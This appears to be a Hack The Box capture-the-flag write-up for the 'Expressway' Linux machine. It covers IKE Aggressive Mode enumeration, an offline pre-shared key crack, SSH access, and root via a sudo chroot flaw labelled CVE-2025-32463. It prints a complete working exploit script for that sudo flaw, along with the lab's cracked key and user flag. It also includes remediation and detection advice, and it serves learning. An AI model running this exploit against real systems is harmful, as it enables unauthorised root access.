---
id: "HTB-2025-002"
title: "Expressway"
excerpt: "Hack The Box Expressway write-up: IKE aggressive mode enumeration, offline PSK crack, SSH foothold, and sudo privilege escalation."
date: "2025-09-20"
tags: ["WRITEUP", "HACKTHEBOX", "LINUX", "EASY", "VPN", "IPSEC", "IKE", "PRIVESC"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "LINUX"
difficulty: "EASY"
severity: "HIGH"
icon: "Terminal"
author: "0x7CC"
---

# Hack The Box — Expressway (Linux) Write-Up: IPsec PSK Crack → SSH Foothold → Sudo PrivEsc (CVE-2025-32463)

## TL;DR
On **Expressway**, the external attack surface is primarily UDP (IPsec/IKE). By enumerating IKE Aggressive Mode, it’s possible to recover material for an **offline PSK crack**, reuse that secret to gain an **SSH foothold** as user `ike`, then escalate to root due to a vulnerable **sudo** version affected by **CVE-2025-32463**.

---

## Target
- Host: `expressway.htb`
- IP: `10.129.6.148`

---

## Recon: UDP scan reveals IPsec gateway

### UDP top ports
- UDP/500: ISAKMP (IKE)
- UDP/4500: NAT-T IKE (often used behind NAT)
- UDP/69: TFTP (potential config leakage)

**Conclusion:** This host behaves like a VPN gateway. The intended path is likely IKE/IPsec rather than typical TCP services.

---

## IKE enumeration: Aggressive Mode + PSK authentication

### Main Mode
IKE responds and discloses proposals (3DES/SHA1/modp1024) and vendor IDs including XAUTH.

### Aggressive Mode
Aggressive Mode is enabled and returns an identity:

- ID type: `ID_USER_FQDN`
- ID value: `ike@expressway.htb`
- Auth: `PSK`

**Why this matters:** Aggressive Mode can leak enough data to enable **offline PSK cracking**.

---

## Offline PSK cracking

By capturing PSK-crack compatible material from the Aggressive handshake and cracking it with a wordlist, the Pre-Shared Key was recovered:

- PSK: `freakingrockstarontheroad`

This demonstrates a classic weakness of Aggressive Mode when used with PSK and guessable secrets.

---

## Foothold: SSH login with recovered secret

Using the recovered secret, SSH access as user `ike` was possible.

### Proof
- `user.txt`: `e8853c306e81f62d6972f72915751f9f`

---

## Local enumeration: linPEAS highlights sudo risk

After landing on the box, I transferred and executed linPEAS to identify privilege escalation vectors.

### Key linPEAS findings
- `sudo` version: **1.9.17**
- Presence of a SUID `sudo` binary in an unusual path (`/usr/local/bin/sudo`)
- Additional suspicious indicators around chroot tooling

---

## Privilege escalation: sudo vulnerability (CVE-2025-32463)

The installed `sudo` version falls within a vulnerable range associated with **CVE-2025-32463**, a local privilege escalation issue in sudo’s chroot-related behavior.

### Result
Privilege escalation to root was achieved by leveraging this sudo weakness.

```exploit.sh
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

---

## Defensive notes / remediation

### Fix
- Update sudo to a patched version (vendor packages typically ship a fix in **1.9.17p1+** or later).
- Avoid maintaining custom SUID sudo builds under `/usr/local/bin` without strict patch management.

### Monitoring / detection ideas
- Watch for `sudo` usage that includes chroot behavior (policy / audit logs).
- Audit systems for:
  - Multiple `sudo` binaries present (especially SUID in `/usr/local/bin`)
  - unexpected NSS configuration changes in temporary directories
  - unusual library load paths during privileged execution

---

## Lessons learned
- When TCP is quiet, **UDP services** (IKE/IPsec) can be the real entry point.
- IKE **Aggressive Mode + PSK** is a high-risk combination; it enables offline cracking.
- Post-foothold, automation like **linPEAS** is excellent for quickly surfacing real misconfigurations and version-based risks.
- Sudo vulnerabilities can be catastrophic when combined with weak operational hygiene (custom installs, delayed patching).

---

## Appendix: Timeline summary
1. UDP scan → identify IPsec (500/udp) and NAT-T (4500/udp)
2. IKE enumeration → Aggressive Mode returns ID `ike@expressway.htb`
3. Capture + offline crack → recover PSK `freakingrockstarontheroad`
4. SSH as `ike` → obtain user flag
5. linPEAS → identify vulnerable sudo version
6. PrivEsc → root access via CVE-2025-32463

---
